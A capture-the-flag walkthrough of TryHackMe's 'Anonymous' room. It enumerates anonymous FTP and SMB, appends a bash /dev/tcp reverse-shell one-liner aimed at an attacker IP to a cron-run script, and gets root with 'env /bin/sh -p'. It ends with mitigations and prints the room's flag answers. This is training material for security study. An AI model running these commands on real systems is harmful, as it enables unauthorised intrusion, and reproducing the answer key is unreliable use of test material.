# Anonymous CTF Walkthrough

**Target:** Anonymous
**Source:** [TryHackMe](https://tryhackme.com/room/anonymous)
**Difficulty:** Medium
**Target IP:** 10.82.133.143

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [SMB Enumeration](#smb-enumeration)
- [Anonymous FTP & Writable Share](#anonymous-ftp--writable-share)
- [Reverse Shell via clean.sh](#reverse-shell-via-cleansh)
- [Local Enumeration & Privilege Escalation](#local-enumeration--privilege-escalation)
- [Room Answers](#room-answers)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Anonymous is a medium-difficulty Linux box that hinges entirely on misconfigured
anonymous access. Both FTP and SMB accept unauthenticated logins, and the FTP
service additionally exposes a *writable* scripts directory that is executed
periodically as a cron job. Overwriting that script with a reverse-shell
payload gives immediate code execution as a low-privileged user, and from
there `env /bin/sh -p` against a SUID-ready `env` binary hands over a root
shell with no further exploitation needed.

**Key Skills Required:**
- Service enumeration (`nmap`)
- SMB share enumeration (`smbclient`)
- Anonymous FTP abuse and writable-directory exploitation
- Reverse shell catching (`nc`)
- SUID binary abuse for privilege escalation (`env`)

---

## Reconnaissance

### Network Scanning

```bash
nmap -sVC -O 10.82.133.143
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 2.0.8 or later (reports as vsFTPd 3.0.3) |
| 22/tcp | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 139/tcp | netbios-ssn | Samba smbd 3.X - 4.X |
| 445/tcp | netbios-ssn | Samba smbd 4.7.6-Ubuntu |

The scan immediately flags two things worth chasing: anonymous FTP login is
allowed, and there's a world-writable `scripts` directory sitting on the FTP
root.

```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
```

> **Q1 — open ports:** `4`
> **Q2 — service on port 21:** `FTP`
> **Q3 — service on ports 139/445:** `smb`

---

## SMB Enumeration

```bash
smbclient -L 10.82.133.143 -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
pics            Disk      My SMB Share Directory for Pics
IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
```

> **Q4 — share name:** `pics`

```bash
smbclient //10.82.133.143/pics -N
smb: \> get corgo2.jpg
smb: \> get puppos.jpeg
```

Both images were pulled down and checked (file type, strings, steghide) —
nothing of value was hidden inside either one. This share is a dead end.

---

## Anonymous FTP & Writable Share

```bash
ftp 10.82.133.143
Name: anonymous
Password: (blank)
230 Login successful.
```

Listing the root share confirms the writable `scripts` directory flagged by
Nmap:

```
ftp> cd scripts
ftp> ls
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1333 Oct 30 20:30 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

`to_do.txt` all but confirms the vulnerability the box wants exploited:

```
I really need to disable the anonymous login...it's really not safe
```

The repeated `removed_files.log` entries ("Running cleanup script: nothing
to delete") show `clean.sh` is being executed on a timer — this is the
foothold.

---

## Reverse Shell via clean.sh

`clean.sh` is world-writable (`-rwxr-xrwx`), so a reverse shell one-liner is
appended to it locally and re-uploaded:

```bash
echo "bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1" >> clean.sh
```

```bash
ftp> put clean.sh clean.sh
226 Transfer complete.
```

A listener is started and the cron job trips it within the next cycle:

```bash
rlwrap nc -nvlp 1234
```

```
connect to [<attacker_ip>] from (UNKNOWN) [10.82.133.143] 47316
namelessone@anonymous:~$ whoami
namelessone
```

> **Foothold:** `namelessone`

```bash
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
```

> **Q5 — user.txt:** `90d6f992585815ff991e68748c414740`

---

## Local Enumeration & Privilege Escalation

`sudo -l` fails without a TTY, so a PTY is upgraded first:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

A SUID sweep is run:

```bash
find / -perm -4000 2>/dev/null
```

Among the results, `/usr/bin/env` stands out as a classic GTFOBins
privilege-escalation primitive when it carries the SUID bit (or is reachable
via sudo without a password — on this box it's directly abusable):

```bash
env /bin/sh -p
# whoami
root
# cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```

> **Q6 — root.txt:** `4d930091c31a622a7ed10f27999af363`

---

## Room Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | Number of open ports | `4` |
| Q2 | Service on port 21 | `FTP` |
| Q3 | Service on ports 139/445 | `smb` |
| Q4 | Share name on the user's computer | `pics` |
| Q5 | user.txt flag | `90d6f992585815ff991e68748c414740` |
| Q6 | root.txt flag | `4d930091c31a622a7ed10f27999af363` |

---

## Vulnerabilities

### 1. Anonymous SMB & FTP Access (High)

**Description:** Both SMB and FTP accept unauthenticated ("anonymous")
logins, exposing internal shares and the FTP root to any unauthenticated
user.

**Impact:** Full read access to internal file shares, and — critically — a
writable directory reachable without credentials.

**Mitigation:**
- Disable anonymous FTP and guest SMB access entirely.
- Require authentication on every share; audit shares periodically.

### 2. World-Writable Script Executed by Cron (Critical)

**Description:** `clean.sh`, inside the FTP-writable `scripts` directory,
is executed on a schedule by a privileged or semi-privileged process, and
any anonymous FTP user can overwrite it.

**Impact:** Unauthenticated remote code execution as the user that runs the
cron job — the direct foothold for this box.

**Mitigation:**
- Never place scheduled/executed scripts inside a directory reachable by
  anonymous or low-privilege accounts.
- Set strict permissions (`644`/`750`, owned by root) on any script invoked
  by cron.

### 3. Privilege Escalation via `env` (Critical)

**Description:** The `env` binary is abusable to spawn a root shell
directly (`env /bin/sh -p`), indicating either a SUID bit or an
inherited-privilege misconfiguration.

**Impact:** Trivial, immediate privilege escalation from the foothold user
to root.

**Mitigation:**
- Remove unnecessary SUID bits from system utilities.
- Audit `find / -perm -4000` output on provisioning and alert on drift from
  a known-good baseline.

---

## Attack Chain Summary

```
Nmap scan → FTP, SSH, SMB
    ↓
smbclient -L → pics share → images checked, no hidden data (dead end)
    ↓
ftp anonymous → scripts/ writable → to_do.txt confirms anon-login risk
    ↓
append reverse shell to clean.sh → re-upload → cron executes it
    ↓
nc listener catches shell → foothold: namelessone
    ↓
find / -perm -4000 → env abusable
    ↓
env /bin/sh -p → root
    ↓
Room complete (Q1–Q6 answered)
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| smbclient | SMB share enumeration and file retrieval |
| ftp | Anonymous FTP enumeration and payload upload |
| netcat (nc) / rlwrap | Reverse shell listener |
| python pty | TTY upgrade for interactive shell |

---

## References

- [TryHackMe — Anonymous](https://tryhackme.com/room/anonymous)
- [Nmap](https://nmap.org/)
- [GTFOBins — env](https://gtfobins.github.io/gtfobins/env/)

---
